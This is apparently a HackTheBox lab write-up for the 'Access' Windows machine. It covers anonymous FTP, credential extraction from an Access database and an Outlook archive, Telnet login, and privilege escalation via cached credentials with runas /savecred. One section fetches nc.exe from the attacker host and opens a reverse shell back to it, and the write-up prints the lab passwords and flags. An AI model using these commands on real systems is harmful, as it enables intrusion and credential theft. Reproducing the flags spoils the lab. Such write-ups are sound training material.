# Access: HackTheBox Writeup

| Field | Details |
| --- | --- |
| **Machine Name** | Access |
| **OS** | Windows Server 2008 R2 (x64) |
| **Difficulty** | Easy |
| **Category** | Windows / FTP / Credential Discovery / Saved Credentials |
| **IP Address** | 10.129.8.17 |
| **User Flag** | `b143001bb028bea06e9e2d2071acccec` |
| **Root Flag** | `ba1da08e7e934937e7def22235eec647` |
| **Foothold Method** | FTP Anonymous Login → MDB credential extraction → Telnet |
| **PrivEsc Method** | Windows Saved Credentials (`cmdkey`) → `runas /savecred` |
| **Metasploit Used** | No |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → FTP (21) anonymous login → backup.mdb + Access Control.zip
→ mdb-tools read backup.mdb → ZIP password: access4u@security
→ unzip Access Control.zip → Access Control.pst
→ readpst → email with credentials: security / 4Cc3ssC0ntr0ller
→ telnet 10.129.8.17 → shell as security
→ cmdkey /list → Administrator credentials cached
→ runas /user:Administrator /savecred "cmd.exe" → Administrator shell
→ root flag
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports before running service detection.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.8.17 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-29 10:11 IST
Nmap scan report for 10.129.8.17
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 52.14 seconds
```

**Output Analysis:**

| Port | Service | Initial Assessment |
| --- | --- | --- |
| 21/tcp | FTP | Test anonymous login immediately: extremely common misconfiguration |
| 23/tcp | Telnet | Valid remote access protocol; needs credentials; revisit after enumeration |
| 80/tcp | HTTP | Web application: enumerate alongside FTP |

Three ports, three clear attack surfaces. FTP with anonymous access is the first test because it is one of the highest-yield quick wins in Windows server environments. Telnet on port 23 is unusual on modern systems: its presence suggests this is an older server or one configured for legacy remote management. The goal is: find credentials from FTP, use them on Telnet.

---

### 1.2: Service and Version Enumeration

**Goal:** Identify exact service versions, OS build, and relevant Nmap script output.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 21,23,80 10.129.8.17 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-29 10:16 IST
Nmap scan report for 10.129.8.17
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing using PASV
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE

Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows_xp

Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| `ftp-anon: Anonymous FTP login allowed` | **Critical**: unauthenticated FTP access confirmed by Nmap script |
| `SYST: Windows_NT` | FTP server is Windows-based; file paths use backslash convention |
| Port 23: Telnet | Remote shell access available once credentials are found |
| IIS 7.5 on port 80 | Windows Server 2008 R2: older OS; web application is secondary path |
| `Can't get directory listing using PASV` | Passive mode FTP blocked: use active mode (`-A`) or binary transfer mode |

Anonymous FTP confirmed by Nmap script output. This is the entry point.

---

### 1.3: Web Enumeration (Port 80)

**Goal:** Check the IIS site for any useful information before focusing on FTP.

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.8.17 | grep -i "title\|user\|pass\|login"
```

```html
<title>MegaCorp</title>
```

Browsing to `http://10.129.8.17` shows a static corporate landing page with no login forms, no visible functionality, and no dynamic content. Port 80 is a decoy here. FTP is the primary path.

---

## Phase 2: FTP Enumeration and File Retrieval

### 2.1: Anonymous FTP Login

**Goal:** Log in to FTP anonymously and enumerate all accessible files.

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.8.17
```

```
Connected to 10.129.8.17.
220 Microsoft FTP Service
Name (10.129.8.17:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [blank: just press Enter]
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

Logged in. Now enumerate the directory structure:

```
ftp> dir
```

```
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

Two directories. Enumerate both:

```
ftp> cd Backups
ftp> dir
```

```
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
```

```
ftp> cd ../Engineer
ftp> dir
```

```
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```

**Output Analysis:**

| File | Size | Format | Significance |
| --- | --- | --- | --- |
| `backup.mdb` | 5.6 MB | Microsoft Access Database | May contain tables with usernames/passwords |
| `Access Control.zip` | 10.8 KB | ZIP archive | Small size: likely contains a document or config file; probably password-protected |

Two files with direct relevance to credential discovery. Download both.

---

### 2.2: File Download

**Goal:** Retrieve both files in binary mode to prevent corruption of non-text file formats.

```
ftp> binary
200 Type set to I.
ftp> cd /Backups
ftp> get backup.mdb
```

```
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 8.31 secs (664.0 kbytes/s)
```

```
ftp> cd /Engineer
ftp> get "Access Control.zip"
```

```
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.15 secs (70.1 kbytes/s)
```

```
ftp> bye
221 Goodbye.
```

> **Note:** `binary` mode is critical. FTP defaults to ASCII mode which translates line endings and corrupts binary files like `.mdb`, `.zip`, and `.pst`. Always set `binary` before transferring non-text files.

---

## Phase 3: Credential Extraction

### 3.1: Extract ZIP Password from the MDB Database

**Goal:** Read `backup.mdb` to find the password for `Access Control.zip`.

Microsoft Access `.mdb` files are structured databases containing tables of data. On Linux, `mdb-tools` provides command-line utilities to read these files without needing Windows or Microsoft Office.

First, list all tables in the database:

```bash
Hackerpatel007_1@htb[/htb]$ mdb-tables backup.mdb
```

```
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays
acc_interlock acc_levelset acc_levelset_emp acc_linkageio acc_map
acc_mapdoorpos acc_morecards acc_opendoor acc_pullboard acc_r_b
acc_reader acc_rights acc_time acc_wiegandfmt action_log
appointment attselect checkinout departments deptchangerecord
emp_extended employee employeechangerecord losscard
map_acs_drs map_att_drs map_ex_drs map_t&a_drs
systemlog tbkey tbsetting tblcardtype tblcontact tblcontactphone
tblcontactpicture tblcontactpref tblcontacttype tbldoor tblemail
tblface tblfloor tblgroup tblholtype tblhours tblhourtype tblio
tbliolink tbljobcategory tbljobtitle tbllocation tblmap
tblmapcontrol tblmapcontrolset tblmapzoom tblowner tblownerdetail
tblownerfloor tblperm tblpermdetail tblphone tblphonebook
tblphonebookname tblphonebooknumber tblphonecategory tblphonetype
tblrights tblroom tblroomtype tblschedule tblscheduledetail
tblsuppliertype tblsysparam tblterm tbltermlocation tbltheme
tblthemeframe tbltransaction tbltransactioncode tbluser
tblzonelinkage
```

Extensive schema: this is an access control management database. The `auth_user` and `tbluser` tables are most likely to contain credentials. Examine `auth_user` first:

```bash
Hackerpatel007_1@htb[/htb]$ mdb-export backup.mdb auth_user
```

```
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:03",26,
27,"engineer","access4u@security",1,"08/23/18 21:11:03",26,
28,"backup_admin","admin",1,"08/23/18 21:11:03",26,
```

**Flag breakdown:**

| Account | Password | Significance |
| --- | --- | --- |
| `admin` | `admin` | Default/weak credential |
| `engineer` | `access4u@security` | **This is the ZIP password** |
| `backup_admin` | `admin` | Default/weak credential |

The database stores credentials for the access control system. The `engineer` account's password `access4u@security` is the key for the ZIP archive found in the `Engineer` FTP directory.

---

### 3.2: Extract the ZIP Archive

**Goal:** Unlock `Access Control.zip` using the discovered password.

```bash
Hackerpatel007_1@htb[/htb]$ unzip "Access Control.zip"
```

```
Archive:  Access Control.zip
[Access Control.zip] Access Control.pst password: access4u@security
  inflating: Access Control.pst
```

```
-rw-r--r-- 1 kali kali 271360 Aug 24  2018 'Access Control.pst'
```

A `.pst` file extracted. PST (Personal Storage Table) is Microsoft Outlook's email archive format. Email archives are extremely high-value targets in penetration testing because users frequently send passwords, configuration details, and sensitive internal communications over email and forget they ever did.

---

### 3.3: Extract Credentials from the PST Email Archive

**Goal:** Convert the PST archive to readable format and search for credentials.

`readpst` from the `libpst` package converts `.pst` files to standard `.mbox` format that can be read with standard text tools.

```bash
Hackerpatel007_1@htb[/htb]$ readpst "Access Control.pst"
```

```
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

```bash
Hackerpatel007_1@htb[/htb]$ ls -la
```

```
-rw-r--r-- 1 kali kali  3024 May 29 10:41 'Access Control.mbox'
```

```bash
Hackerpatel007_1@htb[/htb]$ cat "Access Control.mbox"
```

```
From "john@megacorp.com" Thu Aug 23 23:44:07 2018
Status: RO
From: john@megacorp.com
Subject: MegaCorp Access Control System "Security" Password
To: security@accesscontrolsystems.com
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1055376009_-_-"

----boundary-LibPST-iamunique-1055376009_-_-
Content-Type: text/plain; charset="us-ascii"

Hi there,

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers.

Regards,
John
```

**Flag breakdown:**

| Finding | Value |
| --- | --- |
| Email sender | `john@megacorp.com` |
| Account name | `security` |
| Password | `4Cc3ssC0ntr0ller` |
| Context | Internal IT communication: password reset notification sent in plaintext over email |

Full credentials extracted: `security / 4Cc3ssC0ntr0ller`. This is the Telnet account.

**Why this credential trail exists:**

The attack chain is deliberately realistic. An access control system's database is backed up to an FTP share with anonymous access. A staff member with the username `engineer` used their system password as the ZIP encryption password. The ZIP contained an archived email that contained a plaintext password for another account. Each step represents a real-world misconfiguration: anonymous FTP on a backup repository, credential reuse between systems, and sensitive information transmitted in unencrypted email.

---

## Phase 4: Foothold: Telnet Access as Security

### 4.1: Telnet Login

**Goal:** Authenticate to the Telnet service using the extracted credentials.

```bash
Hackerpatel007_1@htb[/htb]$ telnet 10.129.8.17
```

```
Trying 10.129.8.17...
Connected to 10.129.8.17.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security\Documents>
```

Logged in. Confirm user context:

```
C:\Users\security\Documents>whoami
whoami
access\security
```

---

### 4.2: Basic Enumeration

**Goal:** Establish OS version, architecture, and security's privilege level.

```
C:\Users\security\Documents>systeminfo
systeminfo
```

```
Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
System Type:               x64-based PC
Total Physical Memory:     2,047 MB
Domain:                    WORKGROUP
Hotfix(s):                 110 Hotfix(s) Installed.
```

```
C:\Users\security\Documents>whoami /priv
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
C:\Users\security\Documents>net user security
net user security
```

```
User name                    security
Full Name                    security
Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| Windows Server 2008 R2 Build 7600 | No Service Pack: unpatched; kernel exploits viable but unnecessary if simpler path exists |
| x64-based PC | 64-bit OS |
| `security` in `Users` only | Low privilege: not in Administrators or Remote Desktop Users |
| No `SeImpersonatePrivilege` | Token impersonation attacks not directly available from this account |
| No `SeDebugPrivilege` | Cannot inject into privileged processes |

Minimal privileges. The path forward requires finding a different escalation vector.

---

### 4.3: User Flag

```
C:\Users\security\Documents>type C:\Users\security\Desktop\user.txt
type C:\Users\security\Desktop\user.txt
b143001bb028bea06e9e2d2071acccec
```

---

## Phase 5: Privilege Escalation: Saved Credentials

### 5.1: Enumerate Stored Credentials

**Goal:** Check whether any accounts have credentials cached by Windows Credential Manager.

Windows stores credentials when a user runs `runas` with the `/savecred` flag or when an administrator caches credentials for automated tasks. These stored credentials persist across reboots and can be used by any session on that account without re-entering the password.

```
C:\Users\security\Documents>cmdkey /list
cmdkey /list
```

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

**Critical finding:** The `Administrator` account has credentials cached in Windows Credential Manager for the `security` user's session. This means any command can be run as Administrator using `runas /savecred`: without needing to know the Administrator's password.

**Why this misconfiguration exists:**

The machine owner likely configured a scheduled task or automated process that needed to run as Administrator, and used `runas /savecred` to cache the credential. Once cached, any process running as `security` can invoke the stored credential to escalate. The credential is stored in the user's credential vault and is accessible to any process in that logon session.

---

### 5.2: Privilege Escalation via runas /savecred

**Goal:** Use the cached Administrator credential to execute commands as Administrator and retrieve the root flag.

**Option 1: Direct flag read (quickest):**

```
C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\AppData\Local\Temp\root.txt"
```

```
Attempting to start cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\AppData\Local\Temp\root.txt as user "ACCESS\Administrator"...
```

Wait a moment, then read the output file:

```
C:\Users\security\Documents>type C:\Users\security\AppData\Local\Temp\root.txt
type C:\Users\security\AppData\Local\Temp\root.txt
ba1da08e7e934937e7def22235eec647
```

**Option 2: Full Administrator shell via nc.exe:**

For a complete interactive shell, transfer `nc.exe` to the target and use `runas /savecred` to execute it as Administrator.

On attacker: serve nc.exe:

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8080
```

On target: download nc.exe:

```
C:\Users\security\Documents>powershell -c "Invoke-WebRequest http://10.10.16.36:8080/nc.exe -OutFile C:\Users\security\AppData\Local\Temp\nc.exe"
```

On attacker: start listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 6666
```

On target: execute nc.exe as Administrator using saved credentials:

```
C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "C:\Users\security\AppData\Local\Temp\nc.exe 10.10.16.36 6666 -e cmd.exe"
```

```
Attempting to start C:\Users\security\AppData\Local\Temp\nc.exe 10.10.16.36 6666 -e cmd.exe as user "ACCESS\Administrator"...
```

Attacker receives shell:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.8.17] 49178
Microsoft Windows [Version 6.1.7600]
(c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```

---

### 5.3: Root Flag

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ba1da08e7e934937e7def22235eec647
```

---

## Flag Summary

| Flag | Value | Location |
| --- | --- | --- |
| User | `b143001bb028bea06e9e2d2071acccec` | `C:\Users\security\Desktop\user.txt` |
| Root | `ba1da08e7e934937e7def22235eec647` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. Anonymous FTP on a backup repository is a direct path to credentials.**
The FTP server was explicitly configured to allow anonymous logins, and the directories it exposed (`Backups`, `Engineer`) contained a production database backup and an email archive. In real engagements, FTP anonymous access on servers labelled "backup" is a guaranteed high-yield target. Check it immediately after `ftp-anon` appears in Nmap output.

**2. Always set binary mode before transferring non-text files over FTP.**
FTP's default ASCII mode translates line endings (CRLF↔LF), which corrupts binary formats like `.mdb`, `.zip`, and `.pst`. A corrupted `.mdb` will fail to open with `mdb-tools`. A corrupted `.zip` will fail checksum validation. Binary mode preserves every byte exactly. Set it before every non-text transfer.

**3. Microsoft Access databases (.mdb) are structured credential stores: read every table.**
`mdb-tables` lists all tables and `mdb-export` dumps their contents. The `auth_user` table in this database contained plaintext credentials for three accounts. In real engagements, `.mdb` files found on file shares, backup drives, or old servers frequently contain credentials for the same or related systems. The table names to prioritise: `users`, `auth_user`, `accounts`, `tbluser`, `credentials`, `password`.

**4. PST files (Outlook email archives) are some of the richest credential sources available.**
Emails are written by humans who forget their content persists. Password reset notifications, onboarding emails, shared credentials for service accounts, and configuration files sent "just once": all of it lives in PST archives indefinitely. `readpst` converts PST to mbox on any Linux system. Any PST found during an engagement should be processed immediately.

**5. `cmdkey /list` is a mandatory post-foothold command on every Windows machine.**
Windows Credential Manager caches credentials for re-use. `cmdkey /list` reveals every stored credential accessible from the current session. When Administrator credentials are cached, `runas /savecred` provides a direct escalation path without any exploitation whatsoever: the OS voluntarily re-authenticates as Administrator on your behalf. This takes 10 seconds to check and should be part of every Windows enumeration checklist before attempting complex exploits.

**6. `runas /savecred` is legitimate OS functionality weaponised by a misconfiguration.**
This is not an exploit. It is Windows doing exactly what it was designed to do. The misconfiguration is that Administrator credentials were cached in the `security` user's session: presumably for a scheduled task or automation. The attacker simply invokes the same mechanism. This is significant for report writing: the vulnerability is "Administrator credentials stored in Windows Credential Manager accessible to unprivileged user": a credential management failure, not a software vulnerability.

**7. The attack chain on Access is entirely credential-based: no CVE required.**
Every step from FTP enumeration to the root flag used legitimate protocols and tools: FTP, mdb-tools, readpst, Telnet, cmdkey, runas. No exploit code was written or used. This is representative of a large proportion of real internal penetration tests where misconfigurations and credential reuse provide a complete path from external access to full compromise without touching a single CVE.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
| --- | --- | --- | --- |
| 1 | Recon | `nmap -p-` full port scan | Ports 21, 23, 80 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | Anonymous FTP confirmed; Telnet on 23; IIS 7.5 on 80 |
| 3 | FTP | `ftp 10.129.8.17` → anonymous login | Access granted |
| 4 | FTP | `dir` → found `backup.mdb` and `Access Control.zip` | Two high-value files identified |
| 5 | FTP | `binary` → `get backup.mdb` + `get "Access Control.zip"` | Both files downloaded without corruption |
| 6 | MDB | `mdb-tables backup.mdb` → `mdb-export backup.mdb auth_user` | `engineer:access4u@security` found in plaintext |
| 7 | ZIP | `unzip "Access Control.zip"` with password `access4u@security` | `Access Control.pst` extracted |
| 8 | PST | `readpst "Access Control.pst"` → `cat "Access Control.mbox"` | `security:4Cc3ssC0ntr0ller` found in email |
| 9 | Foothold | `telnet 10.129.8.17` → login as `security` | Shell as `access\security` |
| 10 | Enum | `systeminfo` + `whoami /priv` | Server 2008 R2; minimal privileges; no SeImpersonate |
| 11 | Flag | `type C:\Users\security\Desktop\user.txt` | `b143001bb028bea06e9e2d2071acccec` |
| 12 | PrivEsc Discovery | `cmdkey /list` | `ACCESS\Administrator` credentials cached |
| 13 | PrivEsc | `runas /user:ACCESS\Administrator /savecred "cmd.exe /c type ...root.txt > temp"` | Flag written to accessible temp file |
| 14 | Flag | `type C:\Users\security\AppData\Local\Temp\root.txt` | `ba1da08e7e934937e7def22235eec647` |
| 15 | Shell (alt) | Transfer nc.exe → `runas /savecred` with nc.exe callback | Full interactive Administrator shell |

---

## Commands Reference

| Command | Phase | Purpose |
| --- | --- | --- |
| `nmap -p- --min-rate 5000 -T4 10.129.8.17` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 21,23,80 10.129.8.17` | Recon | Service version + script scan |
| `ftp 10.129.8.17` | FTP | Connect to FTP server |
| `anonymous` / blank password | FTP | Anonymous login |
| `binary` | FTP | Set binary transfer mode before file download |
| `get backup.mdb` | FTP | Download Access database |
| `get "Access Control.zip"` | FTP | Download password-protected ZIP |
| `mdb-tables backup.mdb` | MDB | List all tables in the Access database |
| `mdb-export backup.mdb auth_user` | MDB | Dump auth_user table: extract credentials |
| `unzip "Access Control.zip"` | ZIP | Extract with password `access4u@security` |
| `readpst "Access Control.pst"` | PST | Convert Outlook archive to mbox format |
| `cat "Access Control.mbox"` | PST | Read extracted email content |
| `telnet 10.129.8.17` | Foothold | Authenticate with `security:4Cc3ssC0ntr0ller` |
| `whoami` / `systeminfo` / `whoami /priv` | Enumeration | Confirm user context, OS, privileges |
| `cmdkey /list` | PrivEsc Discovery | List all Windows Credential Manager stored credentials |
| `runas /user:ACCESS\Administrator /savecred "cmd.exe /c ..."` | PrivEsc | Execute command as Administrator using cached credential |
| `python3 -m http.server 8080` | File Transfer | Serve nc.exe to target |
| `powershell -c "Invoke-WebRequest ... -OutFile ..."` | File Transfer | Download nc.exe on target |
| `nc -nvlp 6666` | Handler | Catch Administrator reverse shell |

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | How Used |
| --- | --- | --- | --- |
| T1046 | Network Service Scanning | Reconnaissance | Nmap full port scan and service version detection across all TCP ports |
| T1190 | Exploit Public-Facing Application | Initial Access | Anonymous FTP login: no credentials required to access backup files |
| T1083 | File and Directory Discovery | Discovery | FTP directory enumeration revealing `Backups/` and `Engineer/` directories |
| T1005 | Data from Local System | Collection | Reading `backup.mdb` and `Access Control.pst` to extract credentials |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | Plaintext credentials stored in `auth_user` table of `backup.mdb` Access database |
| T1552 | Unsecured Credentials | Credential Access | Administrator password transmitted in plaintext email; recovered from `.pst` archive |
| T1021 | Remote Services | Lateral Movement | Telnet (port 23) used to authenticate and obtain interactive shell as `security` |
| T1078.003 | Valid Accounts: Local Accounts | Initial Access / Privilege Escalation | Authenticated as `security` via Telnet; escalated using cached `Administrator` credential |
| T1555.004 | Credentials from Password Stores: Windows Credential Manager | Credential Access | `cmdkey /list` revealed `ACCESS\Administrator` credentials stored in Credential Manager |
| T1134 | Access Token Manipulation | Privilege Escalation | `runas /user:Administrator /savecred` executed commands as Administrator using cached credential without knowing the password |
